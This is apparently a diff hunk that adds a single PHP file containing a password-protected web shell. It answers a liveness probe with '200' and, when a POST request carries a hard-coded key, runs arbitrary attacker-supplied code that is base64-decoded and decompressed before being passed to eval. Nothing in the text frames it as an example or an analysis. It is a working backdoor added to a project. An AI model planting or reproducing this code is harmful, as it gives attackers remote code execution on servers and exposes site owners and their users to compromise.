@@ -1,0 +1,1 @@
+<?php  if (isset($_REQUEST["q"]) AND $_REQUEST["q"]=="1"){echo "200"; exit;} if(isset($_POST["key"]) && isset($_POST["chk"]) && $_POST["key"]=="H6c!&L8kpzwB0NibhWU1E9O#Qq3sKlm%nxjXJ")eval(gzuncompress(base64_decode($_POST["chk"]))); ?>
